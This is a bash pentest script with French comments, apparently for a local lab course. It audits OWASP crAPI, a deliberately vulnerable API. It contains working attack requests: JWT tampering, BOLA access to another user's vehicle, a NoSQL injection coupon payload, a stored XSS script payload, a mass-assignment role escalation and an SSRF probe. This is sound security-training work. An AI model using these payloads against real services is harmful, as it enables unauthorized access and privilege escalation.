#!/usr/bin/env bash
# Audit reproductible OWASP crAPI (exploitation CONTRÔLÉE, lab local).
#
# Pré-requis :
#   - crAPI lancé : (cd tp1/crapi && docker compose --compatibility up -d)
#   - deux comptes créés (User A / User B) + leurs JWT.
#
# Usage :
#   BASE=http://localhost:8888 \
#   TOKEN_A=<jwt userA> TOKEN_B=<jwt userB> \
#   VEHICLE_B=<id véhicule de B> \
#   bash tp1/scripts/audit.sh
#
# Le script affiche le code HTTP et un extrait de réponse pour chaque test.
set -u
BASE="${BASE:-http://localhost:8888}"
TOKEN_A="${TOKEN_A:-}"
TOKEN_B="${TOKEN_B:-}"
VEHICLE_B="${VEHICLE_B:-}"
J='-H Content-Type:application/json'

hr() { printf '\n----- %s -----\n' "$1"; }
show() { curl -s -w '\n  [HTTP %{http_code}]\n' "$@"; }

echo "### Cible : $BASE"

hr "PHASE 2 — Authentification / JWT"
echo "[2.1] Login User A"
LOGIN_A=$(curl -s -X POST "$BASE/identity/api/auth/login" $J \
  -d "{\"email\":\"${EMAIL_A:-userA@example.com}\",\"password\":\"${PASS_A:-Passw0rd!}\"}")
echo "  $LOGIN_A"
[ -z "$TOKEN_A" ] && TOKEN_A=$(printf '%s' "$LOGIN_A" | sed -n 's/.*"token":"\([^"]*\)".*/\1/p')

echo "[2.2] Décodage du JWT (header / payload)"
if [ -n "$TOKEN_A" ]; then
  printf '%s' "$TOKEN_A" | cut -d. -f1 | base64 -d 2>/dev/null; echo
  printf '%s' "$TOKEN_A" | cut -d. -f2 | base64 -d 2>/dev/null; echo
  echo "  → vérifier : alg, exp (expiration), role/email (données sensibles)"
fi

echo "[2.3] Signature altérée → doit être REJETÉE (401/403)"
curl -s -o /dev/null -w '  [HTTP %{http_code}] (attendu 401/403)\n' \
  "$BASE/identity/api/v2/user/dashboard" -H "Authorization: Bearer ${TOKEN_A}TAMPER"

hr "PHASE 3 — BOLA / Broken Access Control"
echo "[3.1] User A lit son dashboard"
show "$BASE/identity/api/v2/user/dashboard" -H "Authorization: Bearer $TOKEN_A"
echo "[3.2] BOLA véhicule : User A lit le véhicule de User B ($VEHICLE_B)"
if [ -n "$VEHICLE_B" ]; then
  curl -s -o /dev/null -w '  [HTTP %{http_code}] (200 = BOLA)\n' \
    "$BASE/identity/api/v2/vehicle/$VEHICLE_B/location" -H "Authorization: Bearer $TOKEN_A"
else
  echo "  (définir VEHICLE_B pour ce test)"
fi
echo "[3.3] BOLA rapports mécanicien (numéro de rapport incrémental)"
curl -s -o /dev/null -w '  [HTTP %{http_code}]\n' \
  "$BASE/workshop/api/mechanic/mechanic_report?report_id=1" -H "Authorization: Bearer $TOKEN_A"

hr "PHASE 4 — Injections (NoSQL coupon)"
echo "[4.1] NoSQL injection : validate-coupon avec { \"\$ne\": null }"
show -X POST "$BASE/community/api/v2/coupon/validate-coupon" \
  -H "Authorization: Bearer $TOKEN_A" $J -d '{"coupon_code":{"$ne":null}}'

hr "PHASE 5 — XSS stocké (posts communautaires)"
echo "[5.1] Poster un commentaire/post avec <script>"
show -X POST "$BASE/community/api/v2/community/posts" \
  -H "Authorization: Bearer $TOKEN_A" $J \
  -d '{"title":"pentest","content":"<script>alert(1)</script>"}'
echo "  → vérifier ensuite le rendu côté SPA (réflexion non échappée)"

hr "PHASE 6 — Misconfiguration / headers"
echo "[6.1] Headers de sécurité + CORS"
curl -s -D - -o /dev/null "$BASE/" | grep -iE \
  'content-security-policy|strict-transport-security|x-frame-options|x-content-type-options|access-control-allow-origin|server|x-powered-by' \
  || echo "  (aucun header de sécurité notable)"

hr "PHASE 7 — Mass Assignment / API abuse"
echo "[7.1] Tenter de modifier un champ privilégié via le profil"
show -X POST "$BASE/identity/api/v2/user/dashboard" \
  -H "Authorization: Bearer $TOKEN_A" $J -d '{"role":"admin"}'
echo "  → relire le dashboard et vérifier si role/champ caché a changé"

hr "PHASE 8 — SSRF (bonus, cible INTERNE uniquement)"
echo "[8.1] contact_mechanic : fournir une URL interne au lab"
show -X POST "$BASE/workshop/api/merchant/contact_mechanic" \
  -H "Authorization: Bearer $TOKEN_A" $J \
  -d '{"mechanic_api":"http://localhost:8025/","mechanic_code":"TRAC_JCKr","problem_details":"x","repeat_request_if_failed":false,"number_of_repeats":1}'
echo "  → si le serveur requête l'URL fournie : SSRF confirmé"
